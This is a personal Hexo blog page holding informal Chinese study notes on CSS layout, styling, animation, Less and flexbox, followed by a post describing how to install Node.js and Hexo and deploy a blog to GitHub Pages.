<p>top：定位元素与定位位置上边的距离（这样的属性只存在于开启了定位的元素中，一般元素不适用），这个与margin-top的区别在于 top 只会影响自身，margin-top还会影响别的元素<br><br/><br><br/></p>
<h4 id="绝对定位"><a href="#绝对定位" class="headerlink" title="绝对定位:"></a>绝对定位:</h4><p>会从文档流中脱离</p>
<p>会改变元素的性质  行内变成块  块的宽高被内容撑开</p>
<p>会使元素提升一个层级</p>
<p>参照物为最近的开启了定位的祖先级元素(只要position不为static),如果所有祖先级元素都没有开启定位，则参照物为根元素(html,也称为初始包含块)<br><br/><br><br/></p>
<h4 id="绝对定位元素的过渡约束"><a href="#绝对定位元素的过渡约束" class="headerlink" title="绝对定位元素的过渡约束:"></a>绝对定位元素的过渡约束:</h4><p>当为绝对定位时,<br>left + … +right （共9个值）&#x3D;父元素内容区的宽度</p>
<p>当发生过渡约束时,9个值中如果没有auto,会调整right来使等式成立(如  left:0 right:0  实际上是在左边 right值被改变了)</p>
<p>如果有auto ,则调整auto来使等式成立<br>可设置成auto的值  margin width  left right</p>
<p>当margin-left:auto margin-right:auto  (此时没写left,right  则都默认为auto,这种情况下写margin-left margin-right 无效  需要写left 0 ;right 0 才能生效 为居中，没有写left right的结局是在左边)</p>
<p>垂直方向的等式必须满足 top +margin-top&#x2F;bottom + padding-top&#x2F;bottom +height + border + bottom&#x3D; …包含块的高度</p>
<br/>
<br/>
#### 固定定位: ####
position:fixed
也是一种绝对定位 大部分特点与绝对定位一致

<p>唯一不同的是  固定定位的参照物永远都是  浏览器的视口(视口就是看到的固定不变的 而html  网页 还包含后面可以滚动的部分)，【永远都固定到刚开始看到的位置，不会随着滚动条滚动而<br><br/><br><br/></p>
<h4 id="粘滞定位"><a href="#粘滞定位" class="headerlink" title="粘滞定位:"></a>粘滞定位:</h4><p>position:sticky </p>
<p>当元素到达某个位置时将其固定(不会随着滚动条滑动而滑动)</p>
<p>如  top:100  当元素到达浏览器的视口的100px时固定不动<br><br/><br><br/></p>
<h4 id="层级"><a href="#层级" class="headerlink" title="层级:"></a>层级:</h4><p>定位的元素（position不为static）比一般的元素层级高</p>
<p>定位的元素 层级默认都一样</p>
<p>对于定位的元素:</p>
<p>z-index需要一个整数作为参数 值越大 层级大层级越高  越高越优先显示</p>
<p>如果层级一样 靠下的元素优先显示<br><br/><br><br/></p>
<h4 id="字体族"><a href="#字体族" class="headerlink" title="字体族:"></a>字体族:</h4><p>font-family:<br>字体分类<br>serif 衬线字体<br>sans-serif 非衬线字体<br>monospace 等宽字体</p>
<p>有空格的用’’ 包裹</p>
<p>1 ，2 ，3  电脑里面若有字体1就采用1，没有就采用2, …</p>
<p>电脑里面的字体文件存储的位置  c&gt;Windows&#x2F;Fonts （C:\Windows\Fonts）</p>
<p>如果想让用户使用指定的字体，但用户电脑里面本身没有</p>
<p>@font-face{<br>font-family:myfont;(自定义字体的名字)(这里要注意版权)<br>src：url(…)（如 ZCOOLKuaiLe-Regular.ttf），url(…) 先考虑前面<br>}</p>
<p>div{<br>font-family:myfont;<br>}</p>
<p>这样可以使用在线(服务器上的字体)<br><br/><br><br/></p>
<h4 id="图标字体"><a href="#图标字体" class="headerlink" title="图标字体:"></a>图标字体:</h4><p>li::before{<br>content:”.…”;<br>font-family:…<br>font-weight:…</p>
<p>&lt;span class&#x3D;”fan” &amp;#xs12..;&lt;&#x2F;span</p>
<p>在iconfont中</p>
<p>如:<br>content:’\e625’</p>
<p>而在<span class='iconfont'>&amp;#xe625</span><br><br/><br><br/></p>
<h4 id="行高"><a href="#行高" class="headerlink" title="行高:"></a>行高:</h4><p>行高:文字占有的实际高度(是指单行的行高)<br>line-height:2<br>若为整数，则为自身字体的倍数(font-size的倍数)<br>如<br>font-size:50px;<br>line-height:200px;</p>
<p>则上面75px,下面75px的空隙<br><br/><br><br/></p>
<h4 id="字体的简写属性"><a href="#字体的简写属性" class="headerlink" title="字体的简写属性:"></a>字体的简写属性:</h4><p>font:italic bold  50px&#x2F;2(这里2代表行高，如果不写，会有一个默认值，会覆盖掉前面的line-height)  ‘Times …(字体)’，字体1，字体2;<br>其中字体大小&#x2F;行高,字体族必须放在最后<br><br/><br><br/></p>
<h4 id="文本的垂直对齐"><a href="#文本的垂直对齐" class="headerlink" title="文本的垂直对齐:"></a>文本的垂直对齐:</h4><p>&lt;div…(font-size:50px) &lt;span…(font-size:20px)</p>
<p>给span 添加vertical-align:middle(其他值:bottom top baseline)（这个是在行高范围内，而不是font-size的文字大小内）</p>
<p>图标对齐方式默认为基线baseline<br><br/><br><br/></p>
<h4 id="省略号"><a href="#省略号" class="headerlink" title="省略号:"></a>省略号:</h4><p>white-space:nowrap 设置网页如何处理空白<br>overflow:hidden<br>text-overflow:ellipsis<br><br/><br><br/></p>
<h4 id="hover的使用场景"><a href="#hover的使用场景" class="headerlink" title="hover的使用场景:"></a>hover的使用场景:</h4><p>.current-city:hover + .city-list  前者触发时 后者对应…</p>
  <div class="location"

  <div class="current-city"
  <div class="city-list"
</div
但当移到city-list区域时就会消失

<p>于是将hover给到location(这个就包含了整个区域，上面的current-city就不会包括city-list区域) </p>
<p>浮出的盒子需要设置绝对定位，使其不占页面位置</p>
<p>一些样式考虑除了加给hover之后的，还有本身<br><br/><br><br/></p>
<h4 id="背景"><a href="#背景" class="headerlink" title="背景:"></a>背景:</h4><p>如果背景图片小于元素，则图片会在元素中自动平铺将元素铺满<br>如果背景图片和元素一样大，则会正常显示<br>background-repeat:repeat(默认值)&#x2F;repeat-x&#x2F;repeat-y 沿着某个方向重复&#x2F;no-repeat 不重复<br>background-position:top left 在元素左上角</p>
<p>background-position：10px(往右走)  10px（往下走） </p>
<p>background-clip:border-box(默认值，背景还会出现在边框的下边)&#x2F;padding-box(出现在内容区和内边距)&#x2F;content-box(背景只会出现在内容区)</p>
<p>当背景图片大于元素时:<br>background-size:100px（宽） 100px(高) &#x2F;如果只写一个值，第二个值默认为auto&#x2F;cover（图片比例不变，将元素铺满，这样可能图片显示不全）&#x2F;contain（图片比例不变，显示完整，但可能没有铺满元素）<br>background-attachment:scroll 背景图片会随元素滚动&#x2F; fixed 背景图片不会随元素滚动<br>background:url(‘…’) #bfa  center center&#x2F;contain(这个值必须固定在位置后面)<br>content-box border-box no-repeat</p>
<p>没有顺序要求，也没有哪个属性是必须写的</p>
<p>background-origin:背景图片偏移量计算的原点 padding-box(background-position从内边距开始计算)  content-box(从内容区开始计算)  border-box(从边框处开始计算)</p>
<p>origin 写在前    clip写在后面</p>
<p>渐变颜色:<br>用正方形线条 从上到下选1px  图像-&gt;裁剪  文件_-&gt;存储为web所用格式 存储<br>background-image:url(…)<br>background-repeat:repeat-x<br>前提是高度一致<br><br/><br><br/></p>
<h4 id="雪碧图"><a href="#雪碧图" class="headerlink" title="雪碧图:"></a>雪碧图:</h4><p>解决图片闪烁的问题<br>可以将多个小图片保存在一张大图片中，然后通过background-position来显示图片的位置<br>优点:降低请求的次数，加快访问速度<br><br/><br><br/></p>
<h4 id="线性渐变"><a href="#线性渐变" class="headerlink" title="线性渐变:"></a>线性渐变:</h4><p>颜色沿着一条直线发生变化<br>渐变是图片，需要通过background-image来设置</p>
<p>background-image:linear-gradient(red,yellow)   从上(红色)到底部(黄色)，中间是过渡区域</p>
<p>background-image:linear-gradient(to right ，red,yellow) 从左向右变<br> to top left, 从右下到左上</p>
<p>可以指定多个颜色，多个颜色默认情况下平均分布</p>
<p>background-image:linear-gradient(to right ,red 50px ,yellow)<br>从50px 开始渐变(50px以前的都是红色)  </p>
<p>background-image:linear-gradient(to right ,red 50px ,yellow 100px）如果是200px, 100px后面都是黄色   </p>
<p>background-image: repeating-linear-gradient(to right ,red 50px ,yellow 100px）  重复的线性渐变<br><br/><br><br/></p>
<h4 id="径向渐变"><a href="#径向渐变" class="headerlink" title="径向渐变:"></a>径向渐变:</h4><p>background-image:radial-gradient(red,green)<br>默认情况下 径向渐变的圆心形状根据元素的形状来计算的<br>正方形 -&gt; 圆形</p>
<p>长方形 -&gt; 椭圆形</p>
<p>也可以手动指定径向渐变的大小</p>
<p>background-image：radial-gradient(100px 100px red,green)  100px正方形内的圆中从内到外 渐变</p>
<p>radial-gradient(100px 100px at 0px 0px, red,green) 可以指定渐变的圆心<br><br/><br><br/>      </p>
<h4 id="超链接的伪类"><a href="#超链接的伪类" class="headerlink" title="超链接的伪类:"></a>超链接的伪类:</h4><p>a:link{…表示没有访问过的链接</p>
<p>a:visited{… 表示访问过的链接 由于隐私的原因，只能修改颜色</p>
<p>下面这两个对任何标签都适用<br>：hover{…鼠标移上去的状态 </p>
<p>:active{…点击不松手时的状态<br><br/><br><br/></p>
<h4 id="表格"><a href="#表格" class="headerlink" title="表格:"></a>表格:</h4><table>
thead>tr>td /th (加粗 居中 的效果)  头部
tbody>tr>td 主题
tfoot>tr>td 脚步

<td>这个是行内元素

<p>合并两列: colspan&#x3D;’2’ </p>
<p>合并两行: rowspan&#x3D;’2’</p>
<p>table{</p>
<p>border-spacing:0px; 指定边框之间的距离</p>
<p>border-collapse:collapse;合并边框</p>
<p>}</p>
<p>如果表格中没有写tbody,而是直接写tr,那么浏览器会自动创建一个tbody,并且将tr放到里面</p>
<p>display:table-cell;将元素可以设置成单元格<br>这种情况下 vertical-align:middle; 可以将里面的元素 设置成 垂直居中<br><br/><br><br/></p>
<h4 id="表单"><a href="#表单" class="headerlink" title="表单:"></a>表单:</h4><p>用于提交数据</p>
<form action=""  
actio. 表单要提交数据的服务器的地址
<input type="text" name="..." 
autocomplete="on /off"   历史记录显示与否 （也可以直接给到form 属性上，可直接作用在所有input type="text" 上  

<p>数据要提交到服务器，必须要为元素指定一个name属性</p>
<p>单选按钮  &lt;input type&#x3D;”radio” name&#x3D;’…’  &lt;input …<br>两个必须是同一个name属性 同时还需要有一个value属性<br>checked 默认选中</p>
<p>多选框 type&#x3D;’checkbox’ …（在vue中如果出现多个  关于取值 得这样写<br>&lt;input type&#x3D;’checkbox’v-model&#x3D;’hobby’  value&#x3D;’study’  hobby必须为一个数组  同时必须指定value值，不然每个默认为checked  最后结果全部在数组中 ）</p>
<p>下拉列表</p>
<p>&lt;select name&#x3D;’</p>
<option value='...' selected> ...</option>

<p>input type&#x3D;”submit”  点完就提交了</p>
<p>input type&#x3D;”button”  只是可以点击</p>
<p>input type&#x3D;”reset”  点完重置所有</p>
<p>readonly  将表单项设置为只读性 数据会提交</p>
<p>disabled  将表单项设置为禁用  数据不会提交</p>
<p>autofocus 用于设置表单项 自动获取焦点<br><br/><br><br/></p>
<h4 id="vscode快捷键"><a href="#vscode快捷键" class="headerlink" title="vscode快捷键:"></a>vscode快捷键:</h4><p>按住alt 点击多个 会出现多个光标 可以同时控制多个</p>
<p>.a$*3 &#x3D;&gt;.a1+.a2+.a3<br><br/><br><br/></p>
<h4 id="过渡"><a href="#过渡" class="headerlink" title="过渡:"></a>过渡:</h4><p>属性<br>transition-property:width,height;（all）</p>
<p>过渡时间:<br>transition-duration:2s;</p>
<p>颜色也能适用</p>
<p>必须是一个有效数值向另一个有效数值过渡(如 margin-left:auto   margin-left:0; 不会有过渡效果)</p>
<p>过渡的执行方式<br>transition-timing-function:<br>ease 默认值 慢速开始 先加速 后减速<br>linear  匀速运动<br>ease-in 加速运动<br>ease-out 减速运动<br>ease-in-out 先加速 后匀速</p>
<p>steps(3) 分步骤</p>
<p>transition-delay:2s  等待一定时间后再执行过渡</p>
<p>transition 可以同时设置所有<br>有一个要求 如果要写延迟  第一个是持续时间 第二个是延迟时间<br><br/><br><br/></p>
<h4 id="动画"><a href="#动画" class="headerlink" title="动画:"></a>动画:</h4><p>@keyframes name1{  设置一个关键帧  设置了动画执行的每一个步骤<br>….<br>from （动画的开始位置 ,也可以用0%表示）{ margin-left:0; </p>
<p>to(动画的结束位置,也可以用100%表示){margin-left:200px;</p>
<p>与过渡的区别是  动画不需要操作</p>
<p>.box2{<br>animation-name:name1  对当前元素生效的关键帧的名字<br>animation-duration:2s 动画的执行时间</p>
<p>animation-delay:2s;</p>
<p>animation-timing-function:linear;</p>
<p>animation-iteration-count:2;动画执行的次数 infinite  无限</p>
<p>animation-direction:reverse(反着执行);指定动画运行的方向  （normal）<br>alternate 开始也是从 from 到 to  重复执行动画时反向执行<br>alternate-reverse  开始是从to 到 from  重复执行动画时反向执行</p>
<p>animation-play-state:running（默认值）;设置动画的执行状态 paused（暂停状态）</p>
<p>动画的填充模式<br>animation-fill-mode:none(默认值) 动画执行完毕后 元素回到原来的位置<br>forwards 动画执行完毕后 元素会停止在动画结束的位置<br>backwards  动画延迟等待时 元素就会处于开始状态<br>both 结合了上面两个（forwards 和 backwards）</p>
<h4 id="变形"><a href="#变形" class="headerlink" title="变形:"></a>变形:</h4><p>设置变形效果<br>transform:scaleX&#x2F;Y（2） 水平&#x2F;垂直放大2倍</p>
<p>scale(2) 双方向放大2倍</p>
<p>变形的原点 默认值center center<br>transform-origin:0 20px</p>
<p>transform: translateX（）沿着x轴方向 （水平 向右） translateY)() 垂直向上 translateZ()  向外</p>
<p>不会对布局造成影响</p>
<p>transform:translateX(100%)  相对于自身的百分百  </p>
<p>transform:rotate(X&#x2F;Y&#x2F;Z)<br>transform:rotateZ(180deg&#x2F;1turn 一圈)</p>
<p>是否显示元素的背面<br>backface-visibility:visible 显示   hidden 隐藏<br>z轴；<br>调整元素和人眼之间的距离<br>距离越大，离人越近。<br>z轴平移属于立体效果（近大远小） 默认情况下网页是不支持立体效果的 如果需要看见效果，需要设置网页的视距</p>
<p>html：{<br>perspective:800px(一般 800 到 1000)</p>
<p>…:hover{<br>transform:translateZ（800px）  直接贴满<br><br/><br><br/></p>
<h4 id="元素垂直水平居中"><a href="#元素垂直水平居中" class="headerlink" title="元素垂直水平居中:"></a>元素垂直水平居中:</h4><p>对于盒子大小是确定的</p>
<p>position:absolute;<br>top,right,bottom,left :0;<br>margin:auto;</p>
<p>但对于盒子大小是被内容撑开的:</p>
<p>left:50%;<br>top:50%;<br>transform:translateX(-50%) translateY(-50%);</p>
<h4 id="变量与计算器"><a href="#变量与计算器" class="headerlink" title="变量与计算器:"></a>变量与计算器:</h4><p>css原生支持变量的设置</p>
<p>html{<br>–color:#bfa;<br>–length:100px;</p>
<p>.box1{<br>background-color:var(–color); 使用这个变量<br>width:var(–length)</p>
<p>width:calc(1000px&#x2F;2)  calc相当于计算器( * …</p>
<h4 id="关于less："><a href="#关于less：" class="headerlink" title="关于less："></a>关于less：</h4><p>是css的预处理语言<br>是css的增强版 用更少的代码实现更强的样式</p>
<p>浏览器无法直接执行less代码，必须先转换成css代码，再教给浏览器去执行</p>
<p>easy-less插件<br>建一个less文件，保存后会自动多出一个css文件</p>
<p>好处：<br>less中写的是<br>body{<br>div{<br>color:green;<br>}<br>}</p>
<p>css中会出现<br>body div{<br>color:green;</p>
<p>变量:可以存储任意值 语法: @变量名<br>@a:100px; 这个不会出现在css中<br>.box{<br>width:@a;</p>
<p>作为一部分使用时<br>@c:box6;</p>
<p>background-image:url(“@{c}&#x2F;1.jpg”) 这里引号必须加上</p>
<p>可以在变量声明前使用</p>
<p>&amp;相当于父级元素<br>&amp;:hover{<br>…</p>
<p>.p2:extend(.p1){ 可以拥有p1的样式,同时还能设置自己的样式<br>…</p>
<p>.p3{<br>.p1（） 直接复制了p1的样式</p>
<p>.p4(){专门用来给别人用 混合函数<br>….</p>
<p>.p5{<br>.p4();</p>
<p>上面混合函数中还可以设置变量</p>
<p>.p4(@w,@h,@bg-color){  这里还可以设置默认值 @w:100px;<br>width:@w;</p>
<p>.p5{<br>.p4（200px,300px,green);按顺序传递参数</p>
<p>还可以指定变量名<br>.p5{<br>.p4(@bg-color:red,@w:200px,@h:300px)</p>
<p>color:average(red,orange) 取两个颜色之间的平均值</p>
<p>background-color:darken(#bfa,20%);加深前面的颜色20%</p>
<p>在less中所有数值可以直接运算<br>.box{<br>width:500px + 500px</p>
<p>在less中还可以这样写<br>@import “2.less”  引入其他的less文件（相当于其他的文件的代码 全部复制到这个文件中了）</p>
<h4 id="弹性盒子"><a href="#弹性盒子" class="headerlink" title="弹性盒子:"></a>弹性盒子:</h4><p>display:flex;块级的弹性容器<br>display:inline-flex; 行内的弹性容器</p>
<p>主要是代替浮动完成页面的布局</p>
<p>弹性容器（display:flex）的 子（并不是指后代） 元素是弹性元素</p>
<p>弹性元素的排列方式</p>
<p>flex-direction:row（默认值）&#x2F;column row-reverse column-reverse </p>
<p>主轴:弹性盒子的排列方式</p>
<p>侧轴:与主轴垂直方向的称为侧轴  </p>
<p>指定弹性元素伸展的系数<br>flex-grow:0  当父元素有剩余空间的时候，子元素如何伸展 父元素的剩余空间会按照比例进行分配</p>
<p>0  不会去分配剩余空间</p>
<p>弹性元素的收缩系数 (当父元素的空间不足以容纳所有子元素时，如何对子元素进行收缩)<br>flex-shrink :0&#x2F;1&#x2F;2&#x2F;…  0表示不收缩(默认值为1) 值越大 ，缩的越小</p>
<p>设置弹性元素在弹性容器中是否自动换行<br>flex-wrap:wrap&#x2F;no-wrap（默认值）&#x2F;wrap-reverse(反方向排列)<br>no-wrap 元素沿着辅（侧）轴方向自动换行</p>
<p>direction 和 wrap 的简写属性<br>flex-flow:row wrap </p>
<p>主轴上的元素的排列方式<br>justify-content:flex-start(主轴的起边排列)&#x2F;flex-end(主轴的终边排列)&#x2F;center（元素居中排列）&#x2F;space-around(空白分配到元素两侧)&#x2F;space-evenly(空白分配到元素的单侧)&#x2F;space-between(空白分配到元素之间)</p>
<p>侧轴的对齐方式<br>align-items:stretch 将元素的长度设置为相同值 &#x2F;flex-start 元素不会拉伸 沿着起边对齐&#x2F;flex-end 沿着辅轴的终点对齐&#x2F;center 居中对齐&#x2F;baseline 基线对齐</p>
<p>flex-basis<br>指定的是 元素在主轴上的基础长度<br>如果主轴是 横向的 则该值就是指元素的宽度<br>如果主轴是 纵向的 则该值就是指元素的高度<br>默认值是auto 表示参考元素自身的高度或宽度<br>如果是 一个具体的值 则以该值为主</p>
<p>flex:  增长系数 缩减系数 基础长度<br>默认值是  0 1 auto</p>
<p>order： 0&#x2F;1&#x2F;…<br>决定元素的排列顺序<br>值越大 越靠前排列<br><br/><br><br/></p>
<h4 id="像素"><a href="#像素" class="headerlink" title="像素:"></a>像素:</h4><p>分辨率:1920 * 1080 是指 物像像素<br>在编写网页时所用的都是css像素<br>浏览器在显示网页时，需要将我们的css像素 转换为 物理像素<br>一个css像素与 物理像素的对应比例 取决于浏览器</p>
<p>默认情况下，在pc端 一个css像素 等于 一个物理像素</p>
<p>视口:显示网页的窗口（可以通过拖拽改变大小）（固定定位就是根据视口定位的）</p>
<p>放大两倍的情况:<br>视口宽度:980（css像素）<br>物理像素:1920 （物理像素永远不会变）<br>此时 css像素:物理像素 &#x3D; 1:2<br><br/><br><br/></p>
<h4 id="完美视口"><a href="#完美视口" class="headerlink" title="完美视口:"></a>完美视口:</h4><p>想让pc端的网页在移动端 显示的体验更好</p>
<p>可以通过视口的变化来影响像素比</p>
<p>css像素(视口) &#x2F; 物理像素(固定不变的)<br>可以通过meta标签来改变视口大小</p>
<meta name="viewport" content="width=100px" 

<p>width&#x3D;device-width是指视口宽度就是设备的宽度 简称完美视口</p>
<p>iphone6中像素比为:  100 &#x2F; 750<br>一个css像素对应7.5个物理像素<br>每一款移动设备设计时都会有一个最佳的像素比</p>
<p>a(视口的css像素)&#x2F;750(现在的物理像素)&#x3D;像素比 2.0 （即 1个css像素对应2个物理像素）</p>
<p>iphone6： 375 * 667<br><br/><br><br/></p>
<h4 id="vw："><a href="#vw：" class="headerlink" title="vw："></a>vw：</h4><p>vw：永远相对于视口宽度<br>100vw</p>
<p>%的参照物总是在变化</p>
<p>100vw&#x3D;750px(设计图的大小)<br>a&#x3D;48px(设计图中元素的宽)<br><br/><br><br/></p>
<h4 id="媒体查询"><a href="#媒体查询" class="headerlink" title="媒体查询:"></a>媒体查询:</h4><p>@media only screen（带屏幕的设备）&#x2F;print（打印设备）&#x2F;speech（屏幕阅读器)&#x2F;all{<br>body{<br>color:…<br>}<br>}</p>
<p>only 主要是为了兼容一些老版本的浏览器</p>
<p>@media(width:500px 当视口宽度为500px时){<br>}</p>
<p>min-width:视口的最小宽度<br>max-width:视口的最大宽度</p>
<p>@media （min-width：200px）,(max-width:600px){ ,表示或，满足其一就能生效</p>
<p>@media not（min-width：200px）,(max-width:600px){ not表示除了<br><br/><br><br/></p>
<h4 id="其他"><a href="#其他" class="headerlink" title="其他:"></a>其他:</h4><p>一个元素想让左边留一些间隙，如果设置 margin-left   那么外边那部分不是元素本身拥有的了，如果设置padding-left，空出来的还是元素本身拥有的</p>
<p>若一个元素自身没有设置宽度 则宽度默认为auto ,这种情况下设置padding不会撑大盒子 </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/02/11/CSS/" data-id="cl1dgistz0000ngno6b12gvdn" data-title="CSS" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-使用hexo搭建博客" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/02/11/%E4%BD%BF%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/" class="article-date">
  <time class="dt-published" datetime="2022-02-10T16:59:54.000Z" itemprop="datePublished">2022-02-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/02/11/%E4%BD%BF%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/">使用hexo搭建博客</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>安装Nodejs（不能装最新的 ，应该装  …LTS的）<br>安装Nodejs时出现警告 2503 2502的:<br>任务管理器(ctrl + alt +delete)&gt;文件&gt;运行新任务（方框要勾选）&gt;在输入框中填文件的路径</p>
<p>安装淘宝镜像:npm install -g cnpm –registry&#x3D;<a target="_blank" rel="noopener" href="https://registry.npm.taobao.org/">https://registry.npm.taobao.org</a><br>如果直接卡住:<br>npm 版本太低:升到 8.1.2</p>
<p>如果npm包损坏:<br>C:\Users\Administrator\AppData\Roaming  目录下删掉npm （有关的也删掉）文件夹<br>卸载node<br>重新安装Node</p>
<p>安装hexo:(需要在管理员身份运行的页面)npm install -g hexo-cli<br>hexo init （此处需要先创建一个空的文件夹并且在这个里面开始）初始化一个博客<br>hexo s(start的缩写) 启动博客（这里也必须是管理员身份启动的页面,powershell窗口不行）</p>
<p>管理员身份运行: 开始&gt;鼠标右击&gt;命令提示符(管理员)</p>
<p>cmd命令:<br>切换到D盘: d:<br>进入到文件夹:直接 cd source_posts<br>查看当前目录下的内容(hexo博客情况下)：ls -l<br>对自己创建的博客进行添加内容:vim  文件名.md<br>新建立一个博客  hexo new post  博客名</p>
<p>如果使用markdownpad2写博客出现警告框:<br>Awesomium插件下载链接：<br><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1za81RMtIY_FQRkPd6iJ9rQ">https://pan.baidu.com/s/1za81RMtIY_FQRkPd6iJ9rQ</a> 密码：<br>yho5<br>然后关闭，重新打开</p>
<p>如果编辑博客时出现<br>[o]pen Read-only, (E)dit anyway， ®ecover， (D)elete it，(Q)uit，<br>(A)bort<br>问题原因：编辑文件时断网或同一个文件在上一次编辑时未进行保存，则在下一次想要进行编辑时就会出现：<br>解决方法如下：<br>1、如不想编辑该文档，直接按下q就离开vim，也就是退出编辑<br>2、如想继续重新编辑该文档、按下E</p>
<p>退2层目录 : cd ..&#x2F;..&#x2F; （退到source前面一个目录下面）<br>清理:hexo clean<br>生产: hexo g<br>生成到远程中:hexo d</p>
<p>如果要部署在github上:</p>
<ul>
<li>新建一个仓库<br>仓库名称:昵称.github.io<br>在hexo中安装git插件：（需要在新建的目录下）cnpm install –save hexo-deployer-git<br>查看:ls<br>然后 vim _config.yml<br>滑到最下面deploy配置:<br>type: git<br>repo: 那个github上的仓库地址<br>branch: master<br>这个冒号后面一定要有一个空格</li>
</ul>
<p>写完博客后的保存退出(需要在最后一行):按ESC然后 wq:</p>
<p>若要换主题风格:<br>git clone <a target="_blank" rel="noopener" href="https://github.com/litten/hexo-theme-yilia.git">https://github.com/litten/hexo-theme-yilia.git</a> themes&#x2F;yilia（还是在新建的那个目录下）<br><a target="_blank" rel="noopener" href="https://github.com/litten/hexo-theme-yilia%EF%BC%88%E8%BF%99%E4%B8%AA%E6%98%AF%E5%88%AB%E4%BA%BA%E7%9A%84%E5%8D%9A%E5%AE%A2%EF%BC%89">https://github.com/litten/hexo-theme-yilia（这个是别人的博客）</a><br>vim _config.yml 修改theme 的值 为 yilia<br>然后清理一下 hexo clean<br>生成一下 hexo g<br>启动 hexo s(这个实在_post目录下面)</p>
<p>当建立第二个博客添加内容保存生成时报错:<br>文档里面的标签后面要有空格</p>
<p>若在本地更新内容后，远程博客上没有改变，则刷新原github上的网址,再看github上是否已提交</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/02/11/%E4%BD%BF%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/" data-id="cl1dgisuj0007ngno6ma7bxy9" data-title="使用hexo搭建博客" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2022/03/25/vue2-0-3-0/">vue2.0+3.0</a>
          </li>
        
          <li>
            <a href="/2022/03/22/ES6-11/">ES6-11</a>
          </li>
        
          <li>
            <a href="/2022/03/17/ajax/">ajax</a>
          </li>
        
          <li>
            <a href="/2022/02/25/js2/">js2</a>
          </li>
        
          <li>
            <a href="/2022/02/25/%E8%AE%A1%E7%AE%97%E9%A2%98/">计算题</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2022 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>